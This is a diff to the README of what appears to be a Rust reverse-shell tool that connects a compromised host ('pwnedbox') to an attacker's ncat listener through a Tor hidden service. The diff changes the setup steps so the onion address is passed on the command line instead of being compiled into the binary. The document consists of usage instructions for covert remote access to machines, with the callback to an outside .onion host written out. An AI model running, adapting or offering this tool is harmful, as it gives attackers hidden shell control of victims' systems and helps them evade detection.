@@ -30,22 +30,23 @@ $ cargo build --release
   $ cat /var/lib/tor/hidden_service/hostname
   changeme.onion
   ```
-
-2. Edit ```src/main.rs``` and add your onion address to the ```ONION_LISTENER``` variable
-
-3. Start listener on the hidden service using ```ncat```. MAKE SURE TO ONLY ALLOW LOCALHOST CONNECTIONS
+2. Start listener on the hidden service using ```ncat```. MAKE SURE TO ONLY ALLOW LOCALHOST CONNECTIONS
 
   ```
     user@localhost:~$ ncat --allow 127.0.0.1 -nvl 127.0.0.1 -p 1337
     Ncat: Listening on 0.0.0.0:1337
   ```
 
-4. Execute reverse shell binary, it will create a local tor instance and connect to your listener. This takes about 15 seconds.
+3. Execute reverse shell binary, it will create a local tor instance and connect to your listener. This takes about 15 seconds.
     ```
     user@pwnedbox:~$ ./hsrsh
+    USAGE:
+    	./hsrsh changeme.onion:1337
+
+    user@pwnedbox:~$ ./hsrsh changeme.onion:1337
     ```
 
-5. If everything is setup properly your shell should connect after about 20 seconds or so assuming the tor and internet connection is stable.
+4. If everything is setup properly your shell should connect after about 20 seconds or so assuming the tor and internet connection is stable.
 
   ```    
     user@localhost:~$ ncat --allow 127.0.0.1 -nvlp 1337
